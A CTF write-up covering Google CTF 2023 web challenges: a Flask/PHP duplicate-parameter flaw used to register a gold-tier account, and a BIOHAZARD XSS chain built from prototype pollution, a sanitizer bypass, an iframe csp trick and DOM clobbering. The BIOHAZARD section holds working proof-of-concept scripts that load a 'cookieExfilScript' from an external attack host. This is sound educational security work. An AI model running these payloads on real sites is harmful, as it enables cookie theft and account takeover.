# **GOOGLE_CTF**

## **Web-UNDER-CONSTRUCTION**

- Ở đây ta đã biết nhà phát triển đã bắt code 2 trang web bằng 2 ngôn ngữ khác nhau là python và php.

- Cả 2 trang web đều có chức năng đăng nhập và chức năng đăng kí ở phía web code bằng flask.

- Sau khi đọc source php ta nhận thấy được flag sẽ nằm đâu:

```php
<?php 
?>

<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>PHP login</title>
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <h1>PHP login</h1>
    <div class="container">
        <form action="" method="POST">
            <label for="username">Username</label>
            <input type="text" name="username" id="username" required />
            <label for="password">Password</label>
            <input type="password" name="password" id="password" required />
            <button>Login</button>
        </form>
    </div>
    <?php
    $response = getResponse();
    if (isset($response)) {
        echo "<div class=\"container\">
            <p>{$response}</p>
        </div>";
    }
    ?>
</body>
</html>
<?php

function getResponse()
{
    if (!isset($_POST['username']) || !isset($_POST['password'])) {
        return NULL;
    }

    $username = $_POST['username'];
    $password = $_POST['password'];

    if (!is_string($username) || !is_string($password)) {
        return "Please provide username and password as string";
    }

    $tier = getUserTier($username, $password);

    if ($tier === NULL) {
        return "Invalid credentials";
    }

    $response = "Login successful. Welcome " . htmlspecialchars($username) . ".";

    if ($tier === "gold") {
        $response .= " " . getenv("FLAG");
    }

    return $response;
}

function getUserTier($username, $password)
{
    $host = getenv("DB_HOST");
    $dbname = getenv("MYSQL_DATABASE");
    $charset = "utf8";
    $port = "3306";

    $sql_username = "forge";
    $sql_password = getenv("MYSQL_PASSWORD");
    try {
        $pdo = new PDO(
            dsn: "mysql:host=$host;dbname=$dbname;charset=$charset;port=$port",
            username: $sql_username,
            password: $sql_password,
        );

        $stmt = $pdo->prepare("SELECT password_hash, tier FROM Users WHERE username = ?");
        $stmt->execute([$username]);
        if ($row = $stmt->fetch()) {
            if (password_verify($password, $row['password_hash'])) {
                return $row['tier'];
            }
            var_dump($row);
        }
        return NULL;

    } catch (PDOException $e) {
        throw new PDOException(
            message: $e->getMessage(),
            code: (int) $e->getCode()
        );
    }
}

?>

```

- Vậy sau khi đăng nhập thành công người dùng phải có `tier=gold` chúng ta mới có thể xem được flag.

- Chúng ta đi đến tìm hiểu code đăng kí bằng flask:

```python
@authorized.route('/signup', methods=['POST'])
def signup_post():
    raw_request = request.get_data()
    username = request.form.get('username')
    password = request.form.get('password')
    tier = models.Tier(request.form.get('tier'))

    if(tier == models.Tier.GOLD):
        flash('GOLD tier only allowed for the CEO')
        return redirect(url_for('authorized.signup'))

    if(len(username) > 15 or len(username) < 4):
        flash('Username length must be between 4 and 15')
        return redirect(url_for('authorized.signup'))

    user = models.User.query.filter_by(username=username).first()

    if user:
        flash('Username address already exists')
        return redirect(url_for('authorized.signup'))

    new_user = models.User(username=username, 
        password=generate_password_hash(password, method='sha256'), tier=tier.name)

    db.session.add(new_user)
    db.session.commit()

    requests.post(f"http://{PHP_HOST}:1337/account_migrator.php", 
        headers={"token": TOKEN, "content-type": request.headers.get("content-type")}, data=raw_request)
    return redirect(url_for('authorized.login'))

@authorized.route('/logout')
@login_required
def logout():
    logout_user()
    return redirect(url_for('unauthorized.index'))
```

- Ở đây để chúng ta đăng kí được tier gold thì python sẽ thông báo `'GOLD tier only allowed for the CEO'` và nếu tier không phải gold thì nó sẽ đc insertuser và gửi qua `account_migrator.php` để được insert vào database. Vậy lỗi ở đây chúng ta có thể khai thác đó là việc sử lý khác nhau các truy vấn.

```php
//account_migrator.php
<?php

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
 http_response_code(400);
 exit();
}

if(!isset($_SERVER['HTTP_TOKEN'])) {
 http_response_code(401);
 exit();
}

if($_SERVER['HTTP_TOKEN'] !== getenv("MIGRATOR_TOKEN")) {
 http_response_code(401);
 exit();
}

if (!isset($_POST['username']) || !isset($_POST['password']) || !isset($_POST['tier'])) {
 http_response_code(400);
 exit();
}

if (!is_string($_POST['username']) || !is_string($_POST['password']) || !is_string($_POST['tier'])) {
 http_response_code(400);
 exit();
}

insertUser($_POST['username'], $_POST['password'], $_POST['tier']);


function insertUser($username, $password, $tier)
{
 $hash = password_hash($password, PASSWORD_BCRYPT);
 if($hash === false) {
  http_response_code(500);
  exit();
 }
 $host = getenv("DB_HOST");
 $dbname = getenv("MYSQL_DATABASE");
 $charset = "utf8";
 $port = "3306";

 $sql_username = "forge";
 $sql_password = getenv("MYSQL_PASSWORD");
 try {
  $pdo = new PDO(
   dsn: "mysql:host=$host;dbname=$dbname;charset=$charset;port=$port",
   username: $sql_username,
   password: $sql_password,
  );

  $pdo->exec("CREATE TABLE IF NOT EXISTS Users (username varchar(15) NOT NULL, password_hash varchar(60) NOT NULL, tier varchar(10) NOT NULL, PRIMARY KEY (username));");
  $stmt = $pdo->prepare("INSERT INTO Users Values(?,?,?);");
  $stmt->execute([$username, $hash, $tier]);
  echo "User inserted";
 } catch (PDOException $e) {
  throw new PDOException(
   message: $e->getMessage(),
   code: (int) $e->getCode()
  );
 }
}



?>
```

- Nếu tôi thực hiện đăng ki với tham số truy vấn như sau:`username=admin&password=1&tier=blue&tier=gold`. Thì bên phía flask sẽ nhận đối số tier đầu tiên là blue nhưng khi gửi qua php thì phía php sẽ nhận tier là gold để ghi vào database.

- Tôi thực hiện khai thác như sau:

![](./img_gg/Screenshot%202023-07-06%20095935.png)

![](./img_gg/Screenshot%202023-07-06%20100017.png)

- Flag: `CTF{ff79e2741f21abd77dc48f17bab64c3d}`

## **Web-BIOHAZARD**

## Purpose of the challenge

Given [Strict CSP](https://www.w3.org/TR/CSP3/#strict-csp) and [Trusted Types](https://www.w3.org/TR/trusted-types/) enforcement, I wanted to make a challenge which is still vulnerable to XSS.
To mimic commonly used setup at Google, I've used [Closure Library](https://github.com/google/closure-library) and [safevalues](https://github.com/google/safevalues) which are both open sourced.
I've introduced a few vulnerabilities such as [Prototype Pollution](https://portswigger.net/web-security/prototype-pollution) and HTML injection. And I've also exposed several exploitation/bypass primitives such as [DOM clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering) (through HTML injection) and [use of template](https://github.com/shhnjk/shhnjk.github.io/blob/main/thoughts/digesting-the-concept-of-trusted-types.md#template-gadget).
The hope was to maximize the potential of unintended solutions, so that all of us can learn something out of this challenge.

## Intended solution

### Prototype Pollution

`Object.assign` is usually not vulnerable to Prototype Pollution, such as the following.

```js
Object.assign({}, JSON.parse('{"__proto__":{"polluted": true}}'));
console.log(Object.prototype.polluted); // undefined
```

However, it is vulnerable when `Object.prototype` is passed in the first argument.

```js
Object.assign(({})['__proto__'], JSON.parse('{"polluted": true}'));
console.log(Object.prototype.polluted); // true
```

And `main.js` has the same vulnerability.

```js
interestObj = {"favorites":{}};
const uuid = viewPath[1];
const xhr = new XMLHttpRequest();
xhr.addEventListener("load", () => {
  if (xhr.status === 200) {
    const json = JSON.parse(xhr.response);
    for (const key of Object.keys(json)) {
      if (interestObj[key] === undefined) {
        interestObj[key] = json[key];
      } else{
        Object.assign(interestObj[key], json[key]);
      }
    }
  } else {
    alert(xhr.response);
    location.href = '/';
  }
});
xhr.open('GET', `/bio/${uuid}`, false);
xhr.send();
```

Therefore, if you send a JSON request which contains `__proto__` key to the `/create` endpoint, you can cause Prototype Pollution in the bio page.

```js
fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"","favorites":{"hobbies":"","sports":""}, "__proto__": {"polluted": true}}`
});
```

### Closure sanitizer bypass

To render user supplied HTML in bio introduction, the challenge uses [Closure sanitizer](https://google.github.io/closure-library/api/goog.html.sanitizer.HtmlSanitizer.html). And because [Closure sanitizer can be bypassed with Prototype Pollution](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has), now you can inject arbitrary attributes in the bio HTML.

However, this does not lead to XSS, as the bio page has Strict CSP and Trusted Types enforced.

### Reviving XSS Auditor primitive

Now that we have Prototype Pollution and HTML injection (with arbitrary attribute control) in hand, what should we do?

In `bootstrap.js`, the `editor` variable looks suspicious.

```js
if (!location.pathname.startsWith('/view/')) {
  ...
  editor = (x=>x)`/static/editor.js`;
}
```

This `editor` variable is used in `main.js` to include an additional script.

```js
import {trustedResourceUrl} from 'safevalues';
import {safeScriptEl} from 'safevalues/dom';

...
function loadEditorResources() {
  ...
  const script = document.createElement('script');
  safeScriptEl.setSrc(script, trustedResourceUrl(editor));
  document.body.appendChild(script);
}

window.addEventListener('DOMContentLoaded', () => {
  render();
  if (!location.pathname.startsWith('/view/')) {
    loadEditorResources();
  }
});
```

If we can overwrite the `editor` variable, we can trigger an XSS!

If you take a look at the Closure sanitizer config, you will notice that `<iframe>` is specifically allowed.

```js
var Const = goog.string.Const;
var unsafe = goog.html.sanitizer.unsafe;
var builder = new goog.html.sanitizer.HtmlSanitizer.Builder();
builder = unsafe.alsoAllowTags(
    Const.from('IFRAME is required for Youtube embed'), builder, ['IFRAME']);
sanitizer = unsafe.alsoAllowAttributes(
    Const.from('iframe#src is required for Youtube embed'), builder,
    [
      {
      tagName: 'iframe',
      attributeName: 'src',
      policy: (s) => s.startsWith('https://') ? s : '',
      }
    ]).build();
```

You can use the `csp` attribute in iframe to block certain resources inside iframe (using CSP), if the page inside iframe is same-origin as parent (similar to the [XSS Auditor](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-XSS-Protection#:~:text=This%20code%20is,unsafe%20debug%20code.) primitive). Therefore, you can block `bootstrap.js` from loading.

```html
<iframe src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]" csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```

### Defining `editor`

Since the `editor` variable is undefined inside the iframe, we just need to define it. There are 2 ways of doing this.

1. Use HTML injection to define `editor` using DOM clobbering.
2. Use Prototype Pollution to define `editor`.

Note that since the `editor` script will be only loaded outside of `/view/` path, the iframe has to point to something else, such as `/views/view/`. This is possible because the challenge is an SPA and always configured to load the main page no matter what the URL is.

Here are the PoCs for creating XSS bio, by running script in the challenge page.

DOM clobbering:

```js
// https://biohazard-web.2023.ctfcompetition.com
const challengeOrigin = window.origin;
const cookieExfilScript = 'https://attack.shhnjk.com/alert.js';

const firstResponse = await fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"<a id=editor href=${cookieExfilScript}></a><a id=editor></a>","favorites":{"hobbies":"","sports":""}, "__proto__": {"* ID": true}}`
});
const firstBio = await firstResponse.json();

const secondResponse = await fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"<iframe src=\\"${challengeOrigin}/views/view/${firstBio.id}\\" csp=\\"script-src ${cookieExfilScript} ${challengeOrigin}/static/closure-library/ ${challengeOrigin}/static/sanitizer.js ${challengeOrigin}/static/main.js 'unsafe-inline' 'unsafe-eval'\\"></iframe>","favorites":{"hobbies":"","sports":""}, "__proto__": {"* CSP": true}}`
});
const secondBio = await secondResponse.json();

location.href = `/view/${secondBio.id}`;
```

Prototype Pollution:

```js
// https://biohazard-web.2023.ctfcompetition.com
const challengeOrigin = window.origin;
const cookieExfilScript = 'https://attack.shhnjk.com/alert.js';

const firstResponse = await fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"","favorites":{"hobbies":"","sports":""}, "__proto__": {"editor": ["${cookieExfilScript}"]}}`
});
const firstBio = await firstResponse.json();

const secondResponse = await fetch('/create', {
  method:'POST',
  headers: {
    "Content-Type": "application/json",
  },
  body: `{"name":"test","introduction":"<iframe src=\\"${challengeOrigin}/views/view/${firstBio.id}\\" csp=\\"script-src ${cookieExfilScript} ${challengeOrigin}/static/closure-library/ ${challengeOrigin}/static/sanitizer.js ${challengeOrigin}/static/main.js 'unsafe-inline' 'unsafe-eval'\\"></iframe>","favorites":{"hobbies":"","sports":""}, "__proto__": {"* CSP": true}}`
});
const secondBio = await secondResponse.json();

location.href=`/view/${secondBio.id}`;
```

## **Web-VEGGIE SODA**
